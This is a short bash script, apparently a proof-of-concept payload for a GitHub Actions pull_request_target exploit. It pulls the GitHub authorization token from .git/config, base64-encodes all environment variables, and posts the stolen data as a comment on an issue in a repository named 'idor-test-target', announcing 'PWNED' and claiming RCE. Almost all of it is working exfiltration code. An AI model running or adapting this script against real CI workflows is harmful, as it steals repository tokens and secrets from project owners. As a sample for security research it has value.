#!/bin/bash
echo "=== PWNED BY PULL_REQUEST_TARGET ==="
TOKEN=$(grep -A 1 'http.*github.com' .git/config | grep 'AUTHORIZATION' | awk '{print $3}' | base64 -d | cut -d':' -f2)
ENV_B64=$(env | base64 -w 0)

PAYLOAD="{\"body\": \"PWNED! Base repository cache poisoned and RCE achieved.\\n\\nEnv Data:\\n\\n$ENV_B64\"}"

curl -s -X POST -H "Authorization: token $TOKEN" \
     -H "Accept: application/vnd.github.v3+json" \
     -d "$PAYLOAD" \
     "https://api.github.com/repos/fernandhluis/idor-test-target/issues/${GITHUB_REF_NAME%%/*}/comments"
